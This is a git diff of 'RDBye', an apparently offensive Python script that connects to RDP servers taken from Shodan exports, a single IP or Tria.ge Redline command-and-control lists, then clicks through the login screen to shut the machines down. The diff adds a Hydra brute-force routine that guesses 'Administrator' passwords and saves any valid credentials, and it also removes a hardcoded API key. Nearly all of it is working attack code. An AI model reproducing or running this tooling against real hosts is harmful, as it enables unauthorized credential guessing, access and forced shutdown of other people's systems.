@@ -13,9 +13,7 @@ import argparse
 import string
 import requests
 
-
-
-triage_api_key = "e7caa815f0a1c2730141f1413210af183ab19622"
+triage_api_key = ""
 
 def generate_random_user(length):
     # choose from all lowercase letter
@@ -28,83 +26,108 @@ def print_header():
     possible_fonts = ['banner','big', 'digital', 'shadow']
     f = Figlet(font=possible_fonts[random.randint(0, len(possible_fonts) - 1)])
     print(f.renderText("RDBye"))
+    
+    
+def bruteforce(server, username):
+    print("Starting brute-force attack against " + server + " with username " + username)
+    p = subprocess.Popen("hydra -t 4 -l " + username + " -P ./passwords.txt rdp://" + server, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, shell=True)
+    (output, err) = p.communicate()  
 
+    #This makes the wait possible
+    p_status = p.wait()
+
+    #This will give you the output of the command being executed
+    password_found = False
+    line_counter = 0
+    output_lines = output.decode("utf-8").split("\n")
+    for line in output_lines:
+        if "1 valid password found" in line:
+            print("Valid password found!\n" + output_lines[line_counter - 1])
+            password_found = True
+            with open("valid_credentials.txt", "a+") as output:
+                output.write("Valid password found for " + server + "!\n" + output_lines[line_counter - 1] + "\n")
+        line_counter += 1
+    return password_found
+    
 
 def attack(ip):
-    rdesktop_output = ""
-    server_detected = False
+    try:
+        rdesktop_output = ""
+        server_detected = False
 
-    # For Windows Client systems (7,10,11)
-    shutdown_button = [985,791]
-    shutdown = [992,709]
-    continue_button = [970,726]
-    continue_anyway = [970,726]
+        # For Windows Client systems (7,10,11)
+        shutdown_button = [985,791]
+        shutdown = [992,709]
+        continue_button = [970,726]
+        continue_anyway = [970,726]
 
-    p  = subprocess.Popen(["echo 'yes' | rdesktop -u " + generate_random_user(random.randint(8,16)) + " -n " + generate_random_user(random.randint(8,16)) + " " + ip], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    print("Spawned rdesktop with PID " + str(p.pid) + " to interact with " + ip)       
-    print("Waiting for RDesktop window to load")
+        p  = subprocess.Popen(["echo 'yes' | rdesktop -u " + generate_random_user(random.randint(8,16)) + " -n " + generate_random_user(random.randint(8,16)) + " " + ip], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print("Spawned rdesktop with PID " + str(p.pid) + " to interact with " + ip)       
+        print("Waiting for RDesktop window to load")
     # time.sleep(4)
     
-    rdesktop_spawned = False
-    max_wait_time = 4
-    waited = 0
-    while waited < max_wait_time:
-        out = check_output(["wmctrl -l|awk '{$3=\"\"; $2=\"\"; $1=\"\"; print $0}'"], shell=True)
-        if "rdesktop - " in out.decode("utf-8"):
-            print("Found RDesktop window")
-            rdesktop_spawned = True
-            break
-        else:
-            time.sleep(0.1)
-            waited += 0.1
+        rdesktop_spawned = False
+        max_wait_time = 4
+        waited = 0
+        while waited < max_wait_time:
+            out = check_output(["wmctrl -l|awk '{$3=\"\"; $2=\"\"; $1=\"\"; print $0}'"], shell=True)
+            if "rdesktop - " in out.decode("utf-8"):
+                print("Found RDesktop window")
+                rdesktop_spawned = True
+                break
+            else:
+                time.sleep(0.1)
+                waited += 0.1
             
-    if rdesktop_spawned:
-        # Wait for window to fully load
-        time.sleep(2)
-    else:
-        print("Giving up since no rdesktop window spawned.\n")
-        return    
+        if rdesktop_spawned:
+            # Wait for window to fully load
+            time.sleep(2)
+        else:
+            print("Giving up since no rdesktop window spawned.\n")
+            return         
     
-    # We are getting the color of the RDP window to distinguish between server and client systems since the positions
-    # of the buttons slightly differ
-    print("Checking for OS type...")
-    px = pyautogui.pixel(70,100)
+        # We are getting the color of the RDP window to distinguish between server and client systems since the positions
+        # of the buttons slightly differ
+        print("Checking for OS type...")
+        px = pyautogui.pixel(70,100)
 
-    if str(px) == "RGB(red=8, green=24, blue=66)":
-        print("Detected Windows Server OS")
-        server_detected = True
-        shutdown_button = [966,772]
-        shutdown = [981,681]
-        continue_button = [962,708]
-        continue_anyway = [962,708]
-    else:
-        print("Detected non-server OS (or no RDP window at all)")
+        if str(px) == "RGB(red=8, green=24, blue=66)":
+            print("Detected Windows Server OS")
+            server_detected = True
+            shutdown_button = [966,772]
+            shutdown = [981,681]
+            continue_button = [962,708]
+            continue_anyway = [962,708]
+        else:
+            print("Detected non-server OS (or no RDP window at all)")
 
-    # Click on shutdown button
-    pyautogui.moveTo(shutdown_button[0], shutdown_button[1], duration = 1)
-    pyautogui.click(button='left')
+        # Click on shutdown button
+        pyautogui.moveTo(shutdown_button[0], shutdown_button[1], duration = 1)
+        pyautogui.click(button='left')
 
-    # Click on "shutdown"
-    pyautogui.moveTo(shutdown[0], shutdown[1], duration = 1)
-    pyautogui.click(button='left')
+        # Click on "shutdown"
+        pyautogui.moveTo(shutdown[0], shutdown[1], duration = 1)
+        pyautogui.click(button='left')
 
-    # Click on "Continue"
-    pyautogui.moveTo(continue_button[0], continue_button[1], duration = 1)
-    pyautogui.click(button='left')
+        # Click on "Continue"
+        pyautogui.moveTo(continue_button[0], continue_button[1], duration = 1)
+        pyautogui.click(button='left')
 
-    # Click on "Shutdown anyway"
-    pyautogui.moveTo(continue_anyway[0], continue_anyway[1], duration = 1)
-    pyautogui.click(button='left')
-    print("RDP shutdown initiated!")
-    time.sleep(1)
+        # Click on "Shutdown anyway"
+        pyautogui.moveTo(continue_anyway[0], continue_anyway[1], duration = 1)
+        pyautogui.click(button='left')
+        print("RDP shutdown initiated!")
+        time.sleep(1)
     
-    print("Killing rdesktop session with PID  " + str(p.pid))
-    try:
-        processes = filter(lambda p: psutil.Process(p).name() == "rdesktop", psutil.pids())
-        for pid in processes:
-            os.kill(pid, signal.SIGKILL)
-    except:
-        pass
+        print("Killing rdesktop session with PID  " + str(p.pid))
+        try:
+            processes = filter(lambda p: psutil.Process(p).name() == "rdesktop", psutil.pids())
+            for pid in processes:
+                os.kill(pid, signal.SIGKILL)
+        except:
+            pass
+    except Exception as ex:
+        print("Error during attack: " + str(ex))
     print("\n")
 
 
@@ -117,6 +140,7 @@ parser = argparse.ArgumentParser(
 parser.add_argument('-s', '--shodan', help='JSON file exported from shodan.io')     
 parser.add_argument('-i', '--ip_address', help='Single IP address as target')  
 parser.add_argument('-r', '--redline', help='Downloaddd Redline Command & Control servers from Tria.ge (API key required)', action='store_true')
+parser.add_argument('-b', '--bruteforce', help='Try a predefined set of passwords against the target with username "Administrator"', action='store_true')
 
 args = parser.parse_args()
 if args.shodan:
@@ -140,10 +164,18 @@ if args.shodan:
         random.shuffle(ip_addresses)
 
         for ip in ip_addresses:
-            attack(ip)  
+            password_found = False
+            if args.bruteforce:
+                password_found = bruteforce(ip, "Administrator")
+            if not password_found:   
+                attack(ip)  
              
 elif args.ip_address:
-    attack(args.ip_address)
+    password_found = False
+    if args.bruteforce:
+        password_found = bruteforce(args.ip_address, "Administrator")
+    if not password_found:        
+        attack(args.ip_address)
     
 elif args.redline:
     if triage_api_key == "":
@@ -176,8 +208,12 @@ elif args.redline:
     print("Extracted " + str(len(C2s)) + " from Tria.ge!")
     
     for c2 in C2s:
-        server = c2.split(":")[0]        
-        attack(server)
+        password_found = False
+        server = c2.split(":")[0]
+        if args.bruteforce:
+            password_found = bruteforce(server, "Administrator")
+        if not password_found:        
+            attack(server)
 
 else:
     parser.print_help()    
